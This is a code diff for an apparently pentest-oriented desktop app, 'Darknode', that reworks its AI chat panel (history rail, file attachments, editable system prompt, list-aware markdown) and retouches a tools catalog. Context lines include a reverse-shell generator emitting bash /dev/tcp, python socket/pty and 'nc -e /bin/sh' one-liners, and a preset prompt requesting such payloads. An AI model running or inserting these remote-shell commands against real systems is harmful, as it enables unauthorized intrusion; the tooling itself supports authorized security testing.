@@ -185,11 +185,25 @@ async function ensureScope(kind, rawTarget) {
     };
   });
 }
-// Minimal markdown -> HTML (code fences with copy, inline code, bold).
+// Minimal markdown -> HTML: fenced code (with copy), real <ul>/<ol> lists,
+// paragraphs, inline code and bold. Lists render as proper list elements the
+// way the website does, not literal "- " lines.
+function mdInline(s) { return esc(s).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>"); }
 function mdHtml(t) {
   return String(t).split("```").map((seg, i) => {
     if (i % 2 === 1) { const code = seg.replace(/^[\w+-]*\n/, ""); return `<pre class="code-block"><button class="cb-copy">copy</button><code>${esc(code)}</code></pre>`; }
-    return esc(seg).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>").replace(/\n/g, "<br>");
+    let html = "", list = null, para = [];
+    const flushPara = () => { if (para.length) { html += "<p>" + para.map(mdInline).join("<br>") + "</p>"; para = []; } };
+    const flushList = () => { if (list) { html += "<" + list.tag + ">" + list.items.map((x) => "<li>" + mdInline(x) + "</li>").join("") + "</" + list.tag + ">"; list = null; } };
+    for (const ln of seg.split("\n")) {
+      const ul = ln.match(/^\s*[-*]\s+(.*)$/), ol = ln.match(/^\s*\d+[.)]\s+(.*)$/);
+      if (ul) { flushPara(); if (!list || list.tag !== "ul") { flushList(); list = { tag: "ul", items: [] }; } list.items.push(ul[1]); }
+      else if (ol) { flushPara(); if (!list || list.tag !== "ol") { flushList(); list = { tag: "ol", items: [] }; } list.items.push(ol[1]); }
+      else if (ln.trim() === "") { flushPara(); flushList(); }
+      else { flushList(); para.push(ln); }
+    }
+    flushPara(); flushList();
+    return html;
   }).join("");
 }
 // Single global streaming-token listener; the active run sets _ollamaTokenCb.
@@ -235,10 +249,10 @@ const AI = {
 const DAI_LS = (k, d) => { try { return ((DnSecrets.isSecret(k) ? DnSecrets.get(k) : localStorage.getItem(k)) || "").trim() || d; } catch (_) { return d; } };
 const DAI = {
   MODELS: [
-    { id: "darknode", name: "Darknode AI", kind: "cloud", sub: "web access" },
-    { id: "dn13", name: "Darknode 13b", kind: "local", sub: "on-device", tag: () => DAI_LS("s_dai_13b", "darknode-13b") },
-    { id: "dn33", name: "Darknode 33b", kind: "local", sub: "on-device", tag: () => DAI_LS("s_dai_33b", "darknode-33b") },
-    { id: "fable", name: "Fable", kind: "cloud", sub: "Claude-family", claude: true, model: () => DAI_LS("s_dai_fable_model", "claude-fable-5-1") },
+    { id: "darknode", name: "Darknode AI", kind: "cloud", sub: "web access", group: "Darknode models" },
+    { id: "dn13", name: "Darknode 13b", kind: "local", sub: "on-device", group: "Darknode models", tag: () => DAI_LS("s_dai_13b", "darknode-13b") },
+    { id: "dn33", name: "Darknode 33b", kind: "local", sub: "on-device", group: "Darknode models", tag: () => DAI_LS("s_dai_33b", "darknode-33b") },
+    { id: "fable", name: "Fable", kind: "cloud", sub: "Claude-family", group: "Claude", claude: true, model: () => DAI_LS("s_dai_fable_model", "claude-fable-5-1") },
   ],
   sel: () => DAI_LS("s_dai_sel", "darknode"),
   setSel: (id) => { try { localStorage.setItem("s_dai_sel", id); } catch (_) {} },
@@ -592,7 +606,7 @@ const BROWSER = {
   hex: (r) => io(r, [{ l: "Text->Hex", f: (s) => [...enc.encode(s)].map((b) => b.toString(16).padStart(2, "0")).join(" ") }, { l: "Hex->Text", f: (s) => { let h = s.trim().replace(/[^0-9a-fA-F]/g, ""); if (h.length % 2) h = h + "0"; return new TextDecoder().decode(new Uint8Array((h.match(/.{2}/g) || []).map((b) => parseInt(b, 16)))); } }]),
   jwt: (r) => io(r, [{ l: "Decode", f: (s) => { const p = s.trim().split("."); if (p.length < 2) throw new Error("not a JWT (need header.payload.signature)"); const d = (x) => JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(x.replace(/-/g, "+").replace(/_/g, "/"))))), null, 2); return "HEADER\n" + d(p[0]) + "\n\nPAYLOAD\n" + d(p[1]); } }]),
   revshell: (r) => {
-    r.innerHTML = `<div class="row"><input class="f" id="ip" value="10.0.0.1"><input class="f" id="port" value="4444" style="max-width:100px"></div><div class="btns" id="ls"></div><pre class="out" id="o"></pre>`;
+    r.innerHTML = `<div class="row"><input class="f" id="ip" placeholder="listener IP (e.g. 10.0.0.1)"><input class="f" id="port" placeholder="port (e.g. 4444)" style="max-width:140px"></div><div class="btns" id="ls"></div><pre class="out" id="o"></pre>`;
     const L = { bash: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1`, python3: (i, p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`, nc: (i, p) => `nc -e /bin/sh ${i} ${p}` };
     $("#ls", r).innerHTML = Object.keys(L).map((k) => `<button class="btn sm" data-k="${k}">${k}</button>`).join("");
     $("#ls", r).onclick = (e) => { const b = e.target.closest("[data-k]"); if (b) $("#o", r).textContent = L[b.dataset.k]($("#ip", r).value, $("#port", r).value); };
@@ -1060,36 +1074,70 @@ const sections = {
       ["Reverse shell", "Payloads", "Give me reliable reverse-shell one-liners (bash, python, nc) for an authorized pentest, plus the listener to catch them."],
       ["Recon playbook", "Engagement", "Draft a step-by-step external recon playbook for an authorized engagement against a domain I own."],
     ];
+    // The presentation mirrors the website's Darknode AI (ai2-* markup in
+    // public/js/webai.js): a history rail, a centred welcome state, right-aligned
+    // user bubbles with plain-text replies, and one rounded composer whose inline
+    // bar carries the model picker and tool buttons. The backend (daiStream /
+    // ollamaStream / claudeStream, local-model pull, the agentic tool loop) is the
+    // app's own and is unchanged.
+    const modelOptions = (() => {
+      const groups = []; const seen = new Set();
+      DAI.MODELS.forEach((m) => { const g = m.group || "Models"; if (!seen.has(g)) { seen.add(g); groups.push(g); } });
+      return groups.map((g) => `<optgroup label="${esc(g)}">${DAI.MODELS.filter((m) => (m.group || "Models") === g).map((m) => `<option value="${esc(m.id)}">${esc(m.name)}${m.sub ? " · " + esc(m.sub) : ""}</option>`).join("")}</optgroup>`).join("");
+    })();
     el.innerHTML = `
       <div class="dai blank" id="dai">
-        <div class="dai-top">
-          <span class="dai-brand"><span class="dai-dot"></span>Darknode AI</span>
-          <label class="dai-pick"><select id="dai-model" title="Model">${DAI.MODELS.map((m) => `<option value="${m.id}">${esc(m.name)}${m.sub ? " · " + esc(m.sub) : ""}</option>`).join("")}</select><svg class="dai-pick-caret" viewBox="0 0 24 24" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></label>
-          <button class="dai-new" id="dai-new" title="New chat">New chat</button>
-        </div>
-        <div class="dai-main" id="dai-main">
-          <div class="dai-center" id="dai-center">
-            <img class="dai-logo" src="icon.svg" alt="">
-            <h1 class="dai-greet">How can I help you today?</h1>
-            <p class="dai-sub">Darknode AI — your security copilot for recon, exploits, CVEs and code.</p>
-          </div>
-          <div class="dai-thread" id="dai-thread"></div>
-          <div class="dai-dock">
-            <div class="dai-composer" id="dai-composer">
-              <textarea id="dai-input" rows="1" placeholder="Message Darknode AI" spellcheck="false"></textarea>
-              <button class="dai-send" id="dai-send" aria-label="Send" title="Send">
-                <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M12 20V5M6 11l6-6 6 6" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-              </button>
+        <div class="ai2-shell">
+          <aside class="ai2-hist" id="aiHist" aria-label="Chat history" inert>
+            <div class="ai2-hist-top">
+              <button class="ai2-newchat" id="dai-new"><svg viewBox="0 0 20 20" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M10 4v12M4 10h12" stroke-linecap="round"/></svg>New chat</button>
             </div>
-            <div class="dai-suggest" id="dai-suggest">${SUGGEST.map((s, i) => `<button class="dai-chip" data-s="${i}"><b>${esc(s[0])}</b><span>${esc(s[2])}</span></button>`).join("")}</div>
-            <div class="dai-foot">Darknode AI can make mistakes. Verify commands before running them.</div>
+            <div class="ai2-hist-lbl">Recent chats</div>
+            <div class="ai2-hlist" id="aiHList"></div>
+          </aside>
+          <div class="ai2">
+            <div class="ai2-main" id="dai-thread">
+              <div class="ai2-welcome" id="dai-center">
+                <div class="ai2-logo" aria-hidden="true"><img src="icon.svg" alt=""></div>
+                <h1 class="ai2-h1">Darknode AI</h1>
+                <p class="ai2-lead">Your security copilot. Ask about a CVE, a log, a config or a piece of code — it can also take real actions on this machine. Answers stream in real time.</p>
+                <div class="ai-presets" id="dai-suggest">${SUGGEST.map((s, i) => `<button class="chip" data-s="${i}">${esc(s[0])}</button>`).join("")}</div>
+              </div>
+            </div>
+            <div class="ai2-dock">
+              <div id="aiThumbs" class="ai-thumbs"></div>
+              <div class="ai2-composer">
+                <textarea class="ai2-input" id="dai-input" rows="1" placeholder="Message Darknode AI" spellcheck="false"></textarea>
+                <div class="ai2-bar">
+                  <div class="ai2-bar-l">
+                    <button class="ai2-tool" id="aiHistBtn" title="Show / hide chat history" aria-label="Chat history" aria-haspopup="true" aria-expanded="false" aria-controls="aiHist"><svg viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M4 5h12M4 10h12M4 15h8" stroke-linecap="round"/></svg></button>
+                    <label class="ai2-modelwrap" title="Model">
+                      <select class="ai2-model" id="dai-model" aria-label="AI model">${modelOptions}</select>
+                      <svg class="ai2-model-caret" viewBox="0 0 12 12" width="10" height="10" aria-hidden="true"><path d="M2 4l4 4 4-4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                    </label>
+                    <button class="ai2-tool" id="aiImg" title="Attach text or code file" aria-label="Attach file"><svg viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M13.5 8.5l-4.6 4.6a2.5 2.5 0 01-3.5-3.5l5.3-5.3a1.6 1.6 0 012.3 2.3l-5.3 5.3a.7.7 0 01-1-1l4.9-4.9" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+                    <button class="ai2-tool" id="aiSys" title="System prompt" aria-label="System prompt"><svg viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="10" cy="10" r="2.5"/><path d="M10 3v2M10 15v2M3 10h2M15 10h2M5.5 5.5l1.4 1.4M13.1 13.1l1.4 1.4M14.5 5.5l-1.4 1.4M6.9 13.1l-1.4 1.4" stroke-linecap="round"/></svg></button>
+                    <button class="ai2-tool ai2-tool-txt" id="dai-clear" title="Clear conversation" aria-label="Clear conversation">Clear</button>
+                  </div>
+                  <div class="ai2-bar-r">
+                    <button class="ai2-send" id="dai-send" title="Send" aria-label="Send"><svg viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M10 16V4M5 9l5-5 5 5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+                  </div>
+                </div>
+              </div>
+              <div id="dai-status" class="ai2-status"></div>
+            </div>
           </div>
         </div>
+        <input type="file" id="dai-file" accept="text/*,.md,.markdown,.json,.csv,.tsv,.log,.yml,.yaml,.xml,.svg,.html,.htm,.css,.scss,.js,.jsx,.mjs,.ts,.tsx,.py,.rb,.go,.rs,.c,.h,.cpp,.hpp,.cc,.java,.kt,.swift,.php,.pl,.lua,.r,.sh,.bash,.ps1,.bat,.sql,.toml,.ini,.conf,.cfg,.env,.diff,.patch" multiple hidden>
       </div>`;
-    const dai = $("#dai", el), thread = $("#dai-thread", el), input = $("#dai-input", el);
-    const sendBtn = $("#dai-send", el), modelSel = $("#dai-model", el);
-    let history = [{ role: "system", content: DAI_SYS }];
+    const dai = $("#dai", el), shell = $(".ai2-shell", el), thread = $("#dai-thread", el), input = $("#dai-input", el);
+    const sendBtn = $("#dai-send", el), modelSel = $("#dai-model", el), status = $("#dai-status", el);
+    const welcomeEl = $("#dai-center", el);
+    const SEND_ICON = '<svg viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M10 16V4M5 9l5-5 5 5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+    let sysBase = DAI_LS("s_dai_sys", "") || DAI_SYS;
+    let history = [{ role: "system", content: sysBase }];
     let busy = false, seq = 0;
+    let pendingFiles = [];
     const atBottom = () => thread.scrollHeight - thread.scrollTop - thread.clientHeight < 60;
     const toBottom = () => { thread.scrollTop = thread.scrollHeight; };
 
@@ -1098,21 +1146,22 @@ const sections = {
     if (modelSel.selectedIndex < 0) modelSel.value = "darknode";
     const syncPlaceholder = () => { input.placeholder = "Message " + DAI.model().name; };
     syncPlaceholder();
-    modelSel.onchange = () => { DAI.setSel(modelSel.value); syncPlaceholder(); input.focus(); };
+    modelSel.onchange = () => { DAI.setSel(modelSel.value); syncPlaceholder(); if (status) status.textContent = "Switched to " + DAI.model().name; input.focus(); };
 
     const grow = () => { input.style.height = "auto"; input.style.height = Math.min(input.scrollHeight, 200) + "px"; };
     input.addEventListener("input", grow);
 
-    function addUser(text) {
-      const row = document.createElement("div"); row.className = "dai-msg user";
-      row.innerHTML = `<div class="dai-txt">${esc(text)}</div>`;
+    function addUser(text, files) {
+      const row = document.createElement("div"); row.className = "msg you";
+      const chips = (files && files.length) ? `<div class="msg-files">${files.map((f) => `<span class="msg-file">${esc(f.name)}</span>`).join("")}</div>` : "";
+      row.innerHTML = `<div class="msg-body">${chips}<span class="msg-txt">${esc(text)}</span></div>`;
       thread.appendChild(row); toBottom();
     }
     function addAI() {
-      const row = document.createElement("div"); row.className = "dai-msg ai";
-      row.innerHTML = `<img class="dai-av" src="icon.svg" alt=""><div class="dai-txt md dai-live"></div>`;
+      const row = document.createElement("div"); row.className = "msg ai streaming";
+      row.innerHTML = `<div class="msg-body md dai-live"><span class="ai-dots"><i></i><i></i><i></i></span></div>`;
       thread.appendChild(row); toBottom();
-      return $(".dai-txt", row);
+      return $(".msg-body", row);
     }
     // Local models run on-device via Ollama; pull the tag on first use.
     async function ensureLocal(m, out) {
@@ -1206,7 +1255,7 @@ const sections = {
     // Build the agent system prompt: identity + tool protocol + the live tool list.
     function buildSys() {
       const list = Object.keys(HTOOLS).map((k) => { const t = HTOOLS[k]; const p = Object.keys((t.params && t.params.properties) || {}).join(", "); return "- " + k + "(" + p + ") — " + t.desc; }).join("\n");
-      return DAI_SYS + "\n\nYou are an agent that takes real actions on this machine to accomplish the user's goal — you do not just describe steps, you perform them, like a hands-on engineer. You have these tools:\n" + list + "\n\nTo use a tool, reply with ONLY a JSON object and nothing else: {\"tool\":\"<name>\",\"args\":{...}}. You then receive the tool's result and may call more tools, one at a time. When the task is finished, reply with your final answer as normal prose (never JSON). Prefer acting over explaining. Use absolute paths.\n\nCoding workflow (you run on the user's real machine — use it):\n- Orient before you edit: use repo_map to see the project's files and symbols, and find_symbol to jump to where something is defined.\n- Edit precisely: prefer multi_edit (atomic, all-or-nothing find/replace on one file) or apply_patch (a unified diff) over rewriting whole files with write_file. Read a file before editing it.\n- Verify your work: after changing code, run verify to execute the project's own tests/build and confirm you didn't break anything, then fix and re-verify. Don't declare success blind.";
+      return sysBase + "\n\nYou are an agent that takes real actions on this machine to accomplish the user's goal — you do not just describe steps, you perform them, like a hands-on engineer. You have these tools:\n" + list + "\n\nTo use a tool, reply with ONLY a JSON object and nothing else: {\"tool\":\"<name>\",\"args\":{...}}. You then receive the tool's result and may call more tools, one at a time. When the task is finished, reply with your final answer as normal prose (never JSON). Prefer acting over explaining. Use absolute paths.\n\nCoding workflow (you run on the user's real machine — use it):\n- Orient before you edit: use repo_map to see the project's files and symbols, and find_symbol to jump to where something is defined.\n- Edit precisely: prefer multi_edit (atomic, all-or-nothing find/replace on one file) or apply_patch (a unified diff) over rewriting whole files with write_file. Read a file before editing it.\n- Verify your work: after changing code, run verify to execute the project's own tests/build and confirm you didn't break anything, then fix and re-verify. Don't declare success blind.";
     }
     function addToolCard(name, args) {
       const row = document.createElement("div"); row.className = "dai-tool running";
@@ -1283,7 +1332,7 @@ const sections = {
           return;
         }
         history.push({ role: "assistant", content: res.content });
-        out.remove();
+        (out.closest(".msg") || out).remove();
         const tool = HTOOLS[call.tool];
         const card = addToolCard(call.tool, call.args);
         let result;
@@ -1297,23 +1346,125 @@ const sections = {
     }
     async function send(text) {
       text = (text != null ? text : input.value).trim();
-      if (!text || busy) return;
+      const files = pendingFiles.slice();
+      if ((!text && !files.length) || busy) return;
       busy = true; sendBtn.disabled = true;
       if (dai.classList.contains("blank")) dai.classList.remove("blank");
       input.value = ""; grow();
-      history.push({ role: "user", content: text });
-      addUser(text);
+      // The visible bubble shows what the user typed + the file names; the model sees
+      // the file contents folded in (the app streams plain {role,content} messages).
+      const extra = files.map((f) => `\n\n--- Attached file: ${f.name} ---\n\`\`\`\n${f.content}\n\`\`\``).join("");
+      history.push({ role: "user", content: (text || "(see attached)") + extra });
+      addUser(text || "(see attached)", files);
+      pendingFiles = []; drawThumbs();
       await runTurn();
-      busy = false; sendBtn.disabled = false; input.focus();
+      busy = false; sendBtn.disabled = false; persist(); input.focus();
     }
     sendBtn.onclick = () => send();
     input.onkeydown = (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } };
     $("#dai-suggest", el).onclick = (e) => { const b = e.target.closest("[data-s]"); if (b) send(SUGGEST[+b.dataset.s][2]); };
-    $("#dai-new", el).onclick = () => {
-      history = [{ role: "system", content: DAI_SYS }];
-      thread.innerHTML = ""; dai.classList.add("blank");
-      input.value = ""; grow(); input.focus();
+
+    // ---- attachments: text / code files folded into the next message ----
+    const TEXT_EXT = /\.(txt|md|markdown|json|csv|tsv|log|ya?ml|xml|svg|html?|css|scss|js|jsx|mjs|ts|tsx|py|rb|go|rs|c|h|cpp|hpp|cc|java|kt|swift|php|pl|lua|r|sh|bash|ps1|bat|sql|toml|ini|conf|cfg|env|diff|patch)$/i;
+    function drawThumbs() {
+      const t = $("#aiThumbs", el); if (!t) return;
+      t.innerHTML = pendingFiles.map((f, i) => `<span class="ai-filechip" title="${esc(f.name)}"><svg viewBox="0 0 20 20" width="12" height="12" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true"><path d="M11 3H6a1 1 0 00-1 1v12a1 1 0 001 1h8a1 1 0 001-1V7z" stroke-linejoin="round"/><path d="M11 3v4h4" stroke-linejoin="round"/></svg>${esc(f.name)}<button data-rm-file="${i}" title="remove" aria-label="remove file">&times;</button></span>`).join("");
+    }
+    const addTextFile = (file) => { const rd = new FileReader(); rd.onload = () => { let c = String(rd.result || ""); if (c.length > 100000) c = c.slice(0, 100000) + "\n… [file truncated at 100 KB]"; pendingFiles.push({ name: file.name, content: c }); drawThumbs(); }; rd.readAsText(file); };
+    const addFile = (file) => { if (!file) return; if (TEXT_EXT.test(file.name) || /^text\//.test(file.type || "") || file.type === "application/json" || file.type === "application/xml") return addTextFile(file); if (status) status.textContent = "Skipped “" + file.name + "” — only text and code files can be attached here."; };
+    $("#aiImg", el).onclick = () => $("#dai-file", el).click();
+    $("#dai-file", el).onchange = (e) => { [...e.target.files].forEach(addFile); e.target.value = ""; };
+    $("#aiThumbs", el).onclick = (e) => { const bf = e.target.closest("[data-rm-file]"); if (bf) { pendingFiles.splice(+bf.dataset.rmFile, 1); drawThumbs(); } };
+
+    // ---- system prompt (no native dialog) ----
+    $("#aiSys", el).onclick = () => {
+      const ov = document.createElement("div"); ov.className = "dn-modal-overlay";
+      ov.innerHTML = `<div class="dn-modal" role="dialog" aria-modal="true" style="max-width:640px;width:92vw"><div class="dn-modal-body" style="display:flex;flex-direction:column;gap:10px;text-align:left"><b>System prompt</b><p class="muted" style="margin:0;font-size:.82rem">Controls how Darknode AI behaves for the whole conversation.</p><textarea class="in" id="dai-sysbox" rows="12" spellcheck="false" style="width:100%;resize:vertical;font-family:var(--font-mono,monospace);font-size:.82rem"></textarea></div><div class="dn-modal-btns"><button class="btn sm ghost" data-reset>Reset to default</button><button class="btn sm ghost" data-no>Cancel</button><button class="btn sm" data-yes>Save</button></div></div>`;
+      const box = ov.querySelector("#dai-sysbox"); box.value = sysBase;
+      const finish = () => { document.removeEventListener("keydown", onKey); ov.classList.remove("in"); setTimeout(() => ov.remove(), 200); };
+      const onKey = (e) => { if (e.key === "Escape") finish(); };
+      ov.querySelector("[data-no]").onclick = finish;
+      ov.querySelector("[data-reset]").onclick = () => { box.value = DAI_SYS; };
+      ov.querySelector("[data-yes]").onclick = () => { sysBase = box.value.trim() || DAI_SYS; try { localStorage.setItem("s_dai_sys", sysBase === DAI_SYS ? "" : sysBase); } catch (_) {} history[0] = { role: "system", content: sysBase }; if (status) status.textContent = "System prompt updated."; finish(); };
+      ov.onclick = (e) => { if (e.target === ov) finish(); };
+      document.addEventListener("keydown", onKey);
+      document.body.appendChild(ov); requestAnimationFrame(() => { ov.classList.add("in"); try { box.focus(); } catch (_) {} });
     };
+
+    // ---- conversation persistence + history rail ----
+    const CONV_KEY = "s_dai_convos", CUR_KEY = "s_dai_cur";
+    const loadConvos = () => { try { return JSON.parse(localStorage.getItem(CONV_KEY) || "[]") || []; } catch (_) { return []; } };
+    const saveConvos = (c) => { try { localStorage.setItem(CONV_KEY, JSON.stringify(c.slice(0, 100))); } catch (_) {} };
+    const uid = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
+    let curId = null; try { curId = localStorage.getItem(CUR_KEY) || null; } catch (_) {}
+    const deriveTitle = (msgs) => { const u = msgs.find((m) => m.role === "user"); let t = ((u && u.content) || "New chat").replace(/\s+/g, " ").trim(); if (!t) t = "New chat"; return t.length > 46 ? t.slice(0, 46) + "…" : t; };
+    function persist() {
+      const msgs = history.slice(1).map((m) => ({ role: m.role, content: m.content }));
+      if (!msgs.length) return;
+      if (!curId) { curId = uid(); try { localStorage.setItem(CUR_KEY, curId); } catch (_) {} }
+      const convos = loadConvos();
+      const rec = { id: curId, title: deriveTitle(msgs), ts: Date.now(), msgs };
+      const at = convos.findIndex((c) => c.id === curId);
+      if (at >= 0) convos[at] = rec; else convos.unshift(rec);
+      convos.sort((a, b) => b.ts - a.ts);
+      saveConvos(convos); drawHistory();
+    }
+    function drawHistory() {
+      const lst = $("#aiHList", el); if (!lst) return;
+      const convos = loadConvos();
+      if (!convos.length) { lst.innerHTML = `<div class="ai2-hist-empty">No saved chats yet. Your conversations are saved here automatically.</div>`; return; }
+      lst.innerHTML = convos.map((c) => `<div class="ai2-hitem${c.id === curId ? " active" : ""}"><button class="ai2-hitem-t" data-load="${c.id}"${c.id === curId ? ' aria-current="true"' : ""}>${esc(c.title)}</button><button class="ai2-hitem-x" data-del-convo="${c.id}" title="Delete chat" aria-label="Delete chat ${esc(c.title)}">&times;</button></div>`).join("");
+    }
+    function clearThread() { thread.querySelectorAll(".msg,.dai-tool,.ai-perm").forEach((n) => n.remove()); }
+    function renderThread() {
+      clearThread();
+      for (let i = 1; i < history.length; i++) {
+        const m = history[i]; if (m.role === "system") continue;
+        if (m.role === "user") { const row = document.createElement("div"); row.className = "msg you"; row.innerHTML = `<div class="msg-body"><span class="msg-txt">${esc(String(m.content || "").replace(/\n\n--- Attached file:[\s\S]*$/, ""))}</span></div>`; thread.appendChild(row); }
+        else { const row = document.createElement("div"); row.className = "msg ai"; row.innerHTML = `<div class="msg-body md">${mdHtml(String(m.content || ""))}</div>`; thread.appendChild(row); }
+      }
+      toBottom();
+    }
+    function loadConvo(id) {
+      if (busy) return;
+      const c = loadConvos().find((x) => x.id === id); if (!c) return;
+      curId = id; try { localStorage.setItem(CUR_KEY, id); } catch (_) {}
+      history = [{ role: "system", content: sysBase }];
+      (c.msgs || []).forEach((m) => history.push({ role: m.role, content: m.content }));
+      dai.classList.remove("blank"); renderThread(); drawHistory();
+    }
+    function newChat() {
+      history = [{ role: "system", content: sysBase }];
+      curId = null; try { localStorage.removeItem(CUR_KEY); } catch (_) {}
+      clearThread(); dai.classList.add("blank");
+      pendingFiles = []; drawThumbs();
+      input.value = ""; grow(); drawHistory(); input.focus();
+    }
+    $("#dai-new", el).onclick = () => { newChat(); setHist(false); };
+    $("#dai-clear", el).onclick = () => newChat();
+
+    // Restore the current conversation (if any) on open.
+    if (curId) { const c = loadConvos().find((x) => x.id === curId); if (c && c.msgs && c.msgs.length) { (c.msgs).forEach((m) => history.push({ role: m.role, content: m.content })); dai.classList.remove("blank"); renderThread(); } else curId = null; }
+    drawHistory();
+
+    // History rail is an overlay drawer: inert while closed, Escape / backdrop closes it.
+    const histEl = $("#aiHist", el), histBtn = $("#aiHistBtn", el);
+    const histOpen = () => shell.classList.contains("hist-open");
+    function setHist(open) {
+      if (open === histOpen()) return;
+      shell.classList.toggle("hist-open", open);
+      histEl.toggleAttribute("inert", !open);
+      histBtn.setAttribute("aria-expanded", String(open));
+      if (open) { const t = histEl.querySelector(".ai2-hitem-t[aria-current]") || $("#dai-new", el); if (t) t.focus(); }
+    }
+    histBtn.onclick = (e) => { e.stopPropagation(); setHist(!histOpen()); };
+    shell.addEventListener("click", (e) => { if (histOpen() && !e.target.closest("#aiHist") && !e.target.closest("#aiHistBtn")) setHist(false); });
+    histEl.addEventListener("keydown", (e) => { if (e.key === "Escape") { e.preventDefault(); e.stopPropagation(); setHist(false); histBtn.focus(); } });
+    histEl.addEventListener("click", (e) => {
+      const dx = e.target.closest("[data-del-convo]"); if (dx) { e.stopPropagation(); saveConvos(loadConvos().filter((c) => c.id !== dx.dataset.delConvo)); if (dx.dataset.delConvo === curId) newChat(); else drawHistory(); return; }
+      const ld = e.target.closest("[data-load]"); if (ld) { loadConvo(ld.dataset.load); setHist(false); }
+    });
+
     // Copy button on streamed code blocks.
     thread.onclick = (e) => { const b = e.target.closest(".cb-copy"); if (!b) return; const code = b.parentElement.querySelector("code"); if (code) navigator.clipboard?.writeText(code.textContent).then(() => { b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1200); }).catch(() => _toast("Copy failed")); };
     setTimeout(() => input.focus(), 60);
@@ -2276,7 +2427,7 @@ ${ollamaLine}`;
     // website's Services navigation so the app has the same breadth of tools.
     const D = "https://darknode.ai/";
     const GROUPS = [
-      ["Flagship dashboards", [["prometheus", "PROMETHEUS"], ["sentineleye", "SENTINEL EYE"], ["hydra", "HYDRA Engine"], ["aegis", "AEGIS Ops Center"], ["vanguard", "VANGUARD"], ["phantom", "PHANTOM"], ["citadel", "CITADEL"], ["oracle", "ORACLE"], ["spectre", "SPECTRE"], ["crucible", "CRUCIBLE"], ["navarch", "NAVARCH"], ["secdash", "Security Dashboard"]]],
+      ["Flagship dashboards", [["hydra", "HYDRA Engine"], ["aegis", "AEGIS Ops Center"], ["vanguard", "VANGUARD"], ["phantom", "PHANTOM"], ["citadel", "CITADEL"], ["oracle", "ORACLE"], ["spectre", "SPECTRE"], ["crucible", "CRUCIBLE"], ["navarch", "NAVARCH"], ["secdash", "Security Dashboard"]]],
       ["Offensive Security", [["attacksim", "Threat Simulator"], ["cracklab", "Password Security Lab"], ["exploitdb", "Vulnerability Database"], ["exploitdev", "Security Research Lab"], ["packetcraft", "Packet Crafter"], ["passwordtools", "Password Tools"], ["payloads", "Test Script Forge"], ["payloadgen", "Test Script Generator"], ["pentestconsole", "Security Assessment"], ["privesc", "Privilege Analysis"], ["reverseshell", "Remote Access Testing"]]],
       ["Security Labs", [["firewall", "Firewall Rules"], ["webshell", "Terminal"], ["wirelesslab", "Wireless Lab"], ["xsslab", "Web Security Lab"], ["socialeng", "Social Engineering"]]],
       ["Reconnaissance", [["addressintel", "Address Intel"], ["asnexplorer", "ASN Explorer"], ["attacksurf", "Exposure Mapping"], ["dns", "DNS Toolkit"], ["dnsenum", "DNS Enumeration"], ["dnsrecon", "DNS Recon"], ["ghdb", "Google Dorking"], ["netmap", "Network Mapper"], ["reconplanner", "Recon Planner"], ["securityscanner", "Security Scanner"], ["subdomains", "Subdomain Enum"], ["tools", "Scanner Suite"], ["wayback", "Wayback Machine"]]],
@@ -2313,7 +2464,7 @@ ${ollamaLine}`;
     el.innerHTML = `
       <div id="wt-catalog">
         <h1>Web tools</h1>
-        <p class="sub"><b>${nativeN} tools run offline right here in the app</b> — no browser, no network, nothing leaves this machine. ${platformN} larger platforms (PROMETHEUS, CITADEL, HYDRA…) open live from darknode.ai.</p>
+        <p class="sub"><b>${nativeN} tools run offline right here in the app</b> — no browser, no network, nothing leaves this machine. ${platformN} larger platforms (CITADEL, PHANTOM, HYDRA…) open live from darknode.ai.</p>
         <div class="seg" id="wt-tabs" style="margin-bottom:12px">
           <button data-tab="native" class="on">Toolbox &middot; offline (${nativeN})</button>
           <button data-tab="web">Platforms &middot; live (${platformN})</button>
@@ -4136,7 +4287,7 @@ darknode api stop</code></pre>
       </div>
 
       <div class="card" id="doc-about"><div class="lbl">About</div>
-        <p class="muted"><b>Darknode</b> v<span id="doc-about-ver">2.54.0</span> &mdash; the multi-engine AI coding &amp; security suite. Engines: Claude · local Ollama · OpenCode.</p>
+        <p class="muted"><b>Darknode</b> v<span id="doc-about-ver">—</span> &mdash; the multi-engine AI coding &amp; security suite. Engines: Claude · local Ollama · OpenCode.</p>
         <details class="doc-d"><summary>Terms of Service</summary><p class="muted">Provided "as is", without warranty; all rights reserved. You are solely responsible for lawful, authorized use. To the maximum extent permitted by law the authors are not liable for any damages arising from use, including data loss or misuse. Cloud model usage is governed by your provider's terms.</p></details>
         <details class="doc-d"><summary>Privacy Policy</summary><p class="muted">The app runs on your machine; project state lives in <code>.nexus/</code>. We do not collect your code or prompts. Cloud engines send your prompt to the provider you chose (masked when <code>/redact</code> is on). No personal data is sold.</p></details>
